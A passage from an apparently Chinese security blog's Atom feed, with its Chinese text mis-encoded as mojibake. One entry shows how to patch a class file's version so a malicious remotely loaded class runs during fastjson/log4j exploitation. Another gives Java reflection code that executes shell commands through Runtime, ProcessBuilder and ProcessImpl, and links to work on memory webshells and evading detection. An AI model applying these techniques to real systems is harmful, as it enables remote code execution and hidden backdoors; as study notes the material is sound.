Calc.class</code>ï¼Œç„¶å<code>:%!xxd</code>ä¿®æ”¹ç‰ˆæœ¬å·ä¸º<code>32</code>(50çš„16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯Java6)ï¼Œç„¶åä¿å­˜:<code>:%!xxd -r</code></li><li>åˆ‡æ¢javaç‰ˆæœ¬åˆ°1.7ï¼Œè¿è¡ŒClassæ­£å¸¸<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png"><br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png"></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#0x1-èƒŒæ™¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x1. èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;/a&gt;0x1. èƒŒæ™¯ä»‹ç»&lt;/h2&gt;&lt;p&gt;æ¯”å¦‚&lt;code&gt;fastjson&lt;/code&gt;ã€&lt;code&gt;log4j&lt;/code&gt;ä¸­éœ€è¦è¿œç¨‹åŠ è½½æ¶æ„classæ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ¶æ„Classæ–‡ä»¶çš„ç‰ˆæœ¬é«˜äºç›®æ ‡ç‰ˆæœ¬ï¼Œæ¯”å¦‚æ‰˜ç®¡åœ¨æœåŠ¡å™¨çš„Classæ˜¯1.8ç¼–è¯‘çš„ï¼Œä½†æ˜¯ç›®æ ‡ç‰ˆæœ¬æ˜¯1.7ï¼Œä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å‡ºç°ç±»ä¼¼è¿™æ ·çš„é”™è¯¯ï¼š&lt;code&gt;java.lang.UnsupportedClassVersionError: Unsupported major.minor version&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x2-è§£å†³æ–¹æ³•&quot;&gt;&lt;a href=&quot;#0x2-è§£å†³æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;0x2. è§£å†³æ–¹æ³•&quot;&gt;&lt;/a&gt;0x2. è§£å†³æ–¹æ³•&lt;/h2&gt;&lt;p&gt;ç”¨ä½ç‰ˆæœ¬çš„Javaï¼Œæ¯”å¦‚1.6å»ç¼–è¯‘Classæ–‡ä»¶ï¼Œå°±å¯ä»¥å…¨ç‰ˆæœ¬é€šç”¨ã€‚&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œæ‰‹åŠ¨ä¿®æ”¹Classæ–‡ä»¶ã€‚å½“Javaç‰ˆæœ¬ä¸åŒçš„æ—¶å€™ï¼Œç¼–è¯‘å‡ºæ¥çš„Classæ–‡ä»¶ä¹Ÿä¼šä¸ä¸€æ ·ï¼Œå…¶ä¸­Classæ–‡ä»¶é‡Œé¢ä¼šå¸¦ä¸Šç¼–è¯‘çš„Javaç‰ˆæœ¬å·ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;45 = Java 1.1&lt;/li&gt;
&lt;li&gt;46 = Java 1.2&lt;/li&gt;
&lt;li&gt;47 = Java 1.3&lt;/li&gt;
&lt;li&gt;48 = Java 1.4&lt;/li&gt;
&lt;li&gt;49 = Java 5&lt;/li&gt;
&lt;li&gt;50 = Java 6&lt;/li&gt;
&lt;li&gt;51 = Java 7&lt;/li&gt;
&lt;li&gt;52 = Java 8&lt;/li&gt;
&lt;li&gt;53 = Java 9&lt;/li&gt;
&lt;li&gt;54 = Java 10&lt;/li&gt;
&lt;li&gt;55 = Java 11&lt;/li&gt;
&lt;li&gt;56 = Java 12&lt;/li&gt;
&lt;li&gt;57 = Java 13&lt;/li&gt;
&lt;li&gt;58 = Java 14&lt;/li&gt;
&lt;li&gt;59 = Java 15&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œå°è¯•æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬å·è¯•è¯•ï¼Ÿ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆ‡æ¢åˆ°&lt;code&gt;java&lt;/code&gt;çš„15ç‰ˆæœ¬ï¼Œç¼–è¯‘è¿è¡Œæ­£å¸¸&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨&lt;code&gt;vim -b Calc.class&lt;/code&gt;ï¼Œç„¶å&lt;code&gt;:%!xxd&lt;/code&gt;ä¿®æ”¹ç‰ˆæœ¬å·ä¸º&lt;code&gt;32&lt;/code&gt;(50çš„16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯Java6)ï¼Œç„¶åä¿å­˜:&lt;code&gt;:%!xxd -r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åˆ‡æ¢javaç‰ˆæœ¬åˆ°1.7ï¼Œè¿è¡ŒClassæ­£å¸¸&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(2)-åå°„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection-shell.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection-shell.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:37:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>Runtimeä¸­å¯ä»¥è·å–åˆ°<code>Runtime</code>å®ä¾‹æœ‰ä¸‰ç§æ–¹æ³•:</p><ol><li><code>private static Runtime currentRuntime = new Runtime();</code></li><li><code>public static Runtime getRuntime()</code></li><li><code>private Runtime() &#123;&#125;</code></li></ol><p><img src="/2022/03/22/java-reflection-shell/2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectRuntime</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//åˆ©ç”¨ç§æœ‰å˜é‡ç”Ÿæˆå®ä¾‹ private static Runtime currentRuntime = new Runtime();</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"currentRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//åˆ©ç”¨     public static Runtime getRuntime() &#123;</span>        <span class="token comment">//        return currentRuntime;</span>        <span class="token comment">//    &#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">// åˆ©ç”¨æ„é€ å‡½æ•° private Runtime() &#123;&#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><p>ä½¿ç”¨<code>constructor</code>åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œæ‰€ä»¥éœ€è¦<code>new Object[]</code>å¼ºåˆ¶è½¬æ¢: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessBuilder</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å½“ä½¿ç”¨Listç±»å‹çš„æ„é€ å‚æ•°</span>        <span class="token comment">//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessBuilder</span> reflectProcessBuilder <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ReflectProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        reflectProcessBuilder.ReflectPB0();</span>        <span class="token class-name"><span class="token namespace">reflectProcessBuilder<span class="token punctuation">.</span></span>ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessImpl</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span> redirect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token string">"."</span><span class="token punctuation">;</span>        <span class="token comment">//ç¬¬å››ä¸ªå‚æ•°dirä¸èƒ½ä¸ºç©ºï¼Œä¸ºç©ºä¼šå¤±è´¥ï¼Œè¡¨ç¤ºåœ¨å“ªä¸ªè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> map<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessImpl</span> reflectProcess <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectProcessImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">reflectProcess<span class="token punctuation">.</span></span>ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ForkAndExec"><a href="#ForkAndExec" class="headerlink" title="ForkAndExec"></a>ForkAndExec</h2><p>å¯ä»¥ä½¿ç”¨ASMæ‰§è¡Œï¼Œå‚è€ƒsu18å¸ˆå‚…çš„<a href="https://github.com/su18/JNDI/blob/master/src/main/java/org/su18/asm/payload/Command.java">JNDI</a></p><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><ul><li>åå°„æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆéœ€è¦æ˜ç™½å¦‚ä½•è·å–å®ä¾‹çš„å¯¹è±¡ï¼Œè§Runtimeæ‰§è¡Œå‘½ä»¤çš„ä¸‰ç§æ–¹å¼</li><li><code>constructor</code>åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ³¨æ„å‚æ•°æ˜¯Objectæ•°ç»„ï¼Œä½¿ç”¨<code>new Object[]</code>å¼ºåˆ¶è½¬æ¢</li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://xiashang.xyz/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">è®°ä¸€æ¬¡æ— æ–‡ä»¶Webshellæ”»å‡»åˆ†æ</a></li><li><a href="https://xz.aliyun.com/t/2342">åˆ©ç”¨Javaåå°„å’Œç±»åŠ è½½æœºåˆ¶ç»•è¿‡JSPåé—¨æ£€æµ‹</a></li><li><a href="https://xz.aliyun.com/t/10583">ä»Springå†…å­˜é©¬æ£€æµ‹åˆ°éšå½¢é©¬</a></li><li><a href="https://landgrey.me/blog/12/">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484259&idx=1&sn=2f132a952ec5e30ecefc9d3acef3cac5&chksm=cf36fb23f8417235ba1b14d9bd5c9efd3f293145b4e3b5a1b771f3a97316f15c0500fbfdb724&scene=132#wechat_redirect">Spring cloud gatewayé€šè¿‡SPELæ³¨å…¥å†…å­˜é©¬</a></li><li><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">åŠè‡ªåŠ¨åŒ–æŒ–æ˜requestå®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾</a></li><li><a href="https://www.anquanke.com/post/id/214435">JSP 